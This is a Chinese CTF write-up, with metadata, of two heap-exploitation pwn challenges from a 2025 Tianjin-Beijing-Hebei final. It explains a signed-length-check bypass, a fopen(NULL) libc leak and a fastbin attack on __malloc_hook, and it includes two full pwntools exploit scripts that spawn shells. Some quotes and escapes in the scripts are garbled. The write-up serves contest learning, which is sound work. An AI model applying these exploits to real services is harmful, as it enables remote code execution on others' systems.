---
title: 津京冀网络攻防大赛线下决赛pwn–全场唯一解
contest: 津京冀网络攻防大赛决赛
year: 2025
difficulty: medium
vuln_type: heap_exploit
tags:
- 堆溢出
- 有符号比较绕过
- fopen NULL
- unsorted bin leak
- fastbin attack
- libc2.23
attack_chain: pwn1:fopen(NULL)获取FILE结构libc地址→add两次0x40堆→edit用极大值(0x7fffffff00000000+0x80)触发堆溢出覆盖chunk1 size位→show(1)泄main_arena+88→改chunk1函数指针为system+写/bin/sh→pwn2:UAF+fastbin attack→fake chunk在stdout(bss段)→show泄libc→改__malloc_hook为one_gadget
key_payload: edit new_length=0x7fffffff00000000+0x80;libc=main_arena+88-0x3EC680;libc+0x4F440=system;pwn2:fake chunk at 0x60201d;__malloc_hook=one_gadget[0x4527a,0xf03a4,0xf1247]
one_liner: 津京冀决赛pwn1+pwn2全场唯一解：fopen(NULL) FILE结构泄漏+有符号比较堆溢出+fastbin attack stdout
lesson: 堆题中edit长度校验有符号比较用极大数绕过；fopen(NULL)FILE结构含libc指针可泄漏
quality: high
full_path: 津京冀网络攻防大赛线下决赛pwn–全场唯一解.full.md
meta_path: 津京冀网络攻防大赛线下决赛pwn–全场唯一解.meta.md
images_removed: true
images_removed_count: 5
schema_version: v3.0.0-P0
summary: 津京冀网络攻防大赛线下决赛pwn–全场唯一解。津京冀决赛pwn1+pwn2全场唯一解：fopen(NULL) FILE结构泄漏+有符号比较堆溢出+fastbin attack stdout。经验：堆题中edit长度校验有符号比较用极大数绕过；fopen(NULL)FILE结构含libc指针可泄漏
category: pwn
subcategory: heap_exploitation
time_required: medium
difficulty_score: 3
code_blocks_count: 0
images_count: 5
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/282040.html
reasoning_chain:
- pwn1 丢 IDA 是堆题，符号表被去 → 触发点：蜜汁函数 fopen(NULL, 'w')
- 假设：fopen(NULL) 仍返回 FILE* 指向 libc 地址 → 动作：add 创建两个堆块，FILE 结构存在堆上
- 观察：fopen(NULL) 返回的 FILE* 内含 libc 指针，存放在 chunk 头部 → 下一步：泄 libc
- edit 函数检测 &chunk[n] < chunk 但用有符号比较 → 假设：极大 n 转负数绕过
- 动作：new_length = 0x7fffffff00000000 + 0x80 → fread 不爆但堆溢出
- payload = b'a'*0x48 + p64(0x41) + 'a'*0x28 + p64(0x1000) → 覆盖 chunk1 size
- 动作：show(1) → 泄 main_arena+88 → libc_base = leak - 0x3EC680
- 动作：edit(0, ... + p64(libc+0x4F440=system)) 改函数指针 → edit(1, '/bin/sh') 触发 system
- 'pwn2: libc2.23 + 明显 UAF + edit 没判 free → 假设：fastbin attack'
- 动作：fake chunk in stdout (bss 段 0x403fd0) → show 泄 libc → 改 __malloc_hook = one_gadget 0x4527a
failed_attempts:
- 试图绕过 new_length 用正常大数 → 失败：fread 直接退出
- 试图把 fake chunk 放 GOT 表 → 失败：GOT 表不可写
- 试图用 tcache 攻击 → 失败：libc 2.23 没 tcache
- 试图常规 unsorted bin leak → 失败：edit size 校验能防
key_observations:
- fopen(NULL, 'w') 返回的 FILE* 含 libc 内部指针，可用于 leak
- edit 长度校验有符号比较用极大数绕过（高位变大低位变小）
- fastbin attack 把 fake chunk 放 bss 段（stdout 等可写区）
- one_gadget 在 __malloc_hook 上是 glibc 2.23 RCE 标配
- 符号表被去需用 IDA F5 + 类型推断恢复函数签名
prerequisites:
- glibc 堆管理（fastbin/unsorted bin/main_arena）
- fopen FILE 结构内存布局
- 有符号数溢出绕过整数校验
- one_gadget 工具使用
---
# 津京冀网络攻防大赛线下决赛pwn–全场唯一解

> 原文: https://www.ctfiot.com/282040.html
> ID: 282040

pwn1

全场唯一一个解，但是检测时间有点晚没有播报一血，有点可惜。

丢入ida发现是堆题，题中把符号表去了。

分析发现题目中只能创建两次堆块，并且没有UAF，而且还提供了一个蜜汁函数，创建了一个NULL文件的文件描述符，让后在里面写，而且只有一次机会，感觉没有什么用（实际上有用的，后面会讲）

在 add 函数中，第一次malloc的一个是结构体，逆向的是这个样子

其中 u 是没有被用到的字符, memset是一个函数，chunk就是第二个块。并且注意到 memset函数是一个指针，如果我们能修改这个指针变成我们想要执行的其他函数，即可完成攻击。

这里注意edit函数

注意到漏洞点：

在做edit防止溢出的检测中，是检测&chunk[n]的值是否小于chunk，如果将 n 输入的极大，就会变成负数，从而绕过检查，见下图，比较是有符号比较。

正常来说如果 fread 要读入的字节数是非常大的数字会直接退出，但是这里使用了 (unsigned int) 转换，我们把 n 的高位变大，低位变成想要写的字节数，就能触发堆溢出。

于是我们可以进行两次 add 创建两个结构体，对编号0的堆块修改，使其覆盖到编号1的堆块，修改其size位，使得 show 堆块1的时候能够泄露额外数据从而得到libc基地址。至于如何获得堆地址，在最开始的时候有提到过一个 fopen NULL 文件的函数，在这里创建的文件描述符会被放在堆块上，这里面就有我们想要的libc的地址。

得到PC地址之后便可以修改对于块的函数指针成为system然后调用即可。

Exp:

Python from pwn import * import sys HOST = sys.argv[1] PORT = int(sys.argv[2]) context(os=’linux’, arch=’amd64′) #context.log_level = ‘debug’ def debug(): gdb.attach(io) io = remote(HOST, PORT) #io= process(“./pwn”) io.sendlineafter(b’input your name:’, b’123′) # io.sendlineafter(b’> ‘, b’5’) # io.sendlineafter(b’pratice:’, b’aaaa’) io.sendlineafter(b’> ‘, b’2’) io.sendlineafter(b’role name:’, b’0xa6′) io.sendlineafter(b'(y/n)’, b’y’) io.sendlineafter(b’length:’, str(0x40).encode()) io.sendlineafter(b’description:’, b’why’) io.sendlineafter(b’> ‘, b’2’) io.sendlineafter(b’role name:’, b’0xa6′) io.sendlineafter(b'(y/n)’, b’y’) io.sendlineafter(b’length:’, str(0x40).encode()) io.sendlineafter(b’description:’, b’why??’) io.sendlineafter(b’> ‘, b’4’) io.sendlineafter(b’s id:’, b’0′) io.sendlineafter(b’new length:’, str(0x7fffffff00000000 + 0x80).encode()) payload = b’a’ * 0x48 + p64(0x41) + b’a’ * 0x28 + p64(0x1000) io.sendafter(b’description:’, payload) io.sendlineafter(b’> ‘, b’5’) io.sendlineafter(b’pratice:’, b’aaaa’) io.sendlineafter(b’> ‘, b’1’) io.sendlineafter(b’id:’, b’1′) #debug() io.recvuntil(b’n’) io.recv(0xb8) libc = u64(io.recv(8)) – 0x3EC680 print(hex(libc)) io.sendlineafter(b’> ‘, b’4’) io.sendlineafter(b’s id:’, b’0′) io.sendlineafter(b’new length:’, str(0x7fffffff00000000 + 0x78).encode()) payload = b’a’ * 0x48 + p64(0x41) + b’a’ * 0x20 + p64(libc + 0x4F440) io.sendafter(b’description:’, payload) io.sendlineafter(b’> ‘, b’4’) io.sendlineafter(b’s id:’, b’1′) io.sendlineafter(b’new length:’, str(0x8).encode()) ##debug() io.sendafter(b’description:’, ‘/bin/shx00’) io.sendline(b’cat flag’) p = io.recv(1000) print(p) io.interactive()

pwn2

发现明显的uaf，并且libc版本是2.23

add堆块大小需要小于等于0x70

edit逻辑也没判断是否free，存在use after edit

直接打fastbin attack ，注意伪造的chunk的size位和写权限，got表不可写，所以将fake chunk设置在bss段的stdout处，从而show出libc地址

之后就是劫持malloc_hook为ogg即可获取shell

题外话：主要交互方式和利用方法ida mcp即可解决大部分，还是第一次用，调教了很长时间还是不能让它自己给出完整利用脚本，只能自己上手了（），但基本利用方法还是没问题的，再加上gdb mcp和更加完整的prompt应该就能大差不差，感兴趣的师傅真的可以尝试一下

Python #!/usr/bin/env python3 # -*- coding: utf-8 -*- “”” lunch 完整可用利用脚本 策略：仔细规划内存布局，避免破坏关键数据 “”” from pwn import * context(arch=’amd64′, os=’linux’, log_level=’debug’) BINARY = ‘./lunch’ exe = ELF(BINARY, checksec=False) def create(idx, size): p.sendlineafter(b’Exit’, b’1′) p.sendlineafter(b’position’, str(idx).encode()) p.sendlineafter(b’size’, str(size).encode()) def modify(idx, data): p.sendlineafter(b’Exit’, b’2′) p.sendlineafter(b’menu’, str(idx).encode()) p.sendafter(b’food’, data) def view(idx): p.sendlineafter(b’Exit’, b’3′) p.sendlineafter(b’lunch’, str(idx).encode()) def delete(idx): p.sendlineafter(b’Exit’, b’4′) p.sendlineafter(b’delete’, str(idx).encode()) def exploit(): global p p = process(BINARY) log.info(“=”*60) log.info(“Lunch Binary 完整利用”) log.info(“=”*60) # 关键地址 ptr_array = 0x602040 size_array = 0x602360 free_got = 0x602518 create(0, 0x68) create(1, 0x68) create(7, 0x68) create(8, 0x68) create(9, 0x68) create(2, 0x10) delete(1) delete(0) # 修改fd指向fake chunk payload = p64(0x60201d) modify(0, payload) # 分配遍历fastbin create(3, 0x68) create(4, 0x68) view(3) p.recvuntil(b’to seen’) p.recv(3) libc_base = u64(p.recv(6).ljust(8,b’x00′)) – 3954208 print(b’msg = ‘,hex(libc_base)) delete(9) delete(8) delete(7) view(7) p.recvuntil(b’to seen’) p.recv(17) heap = u64(p.recv(6).ljust(8,b’x00′)) print(b’msg = ‘,hex(heap)) fake = libc_base + 3951341 payload = p64(fake) modify(7, payload) create(10, 0x68) create(11, 0x68) #ogg= [0x4526a,0xf02a4,0xf1147] ogg = [0x4527a,0xf03a4,0xf1247] payload = b’x00’*19 + p64(libc_base + ogg[2]) modify(11, payload) #gdb.attach(p) create(13,0×20) p.interactive() if __name__ == ‘__main__’: exploit()

本篇文章来源于微信公众号: Zer0day安全

---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]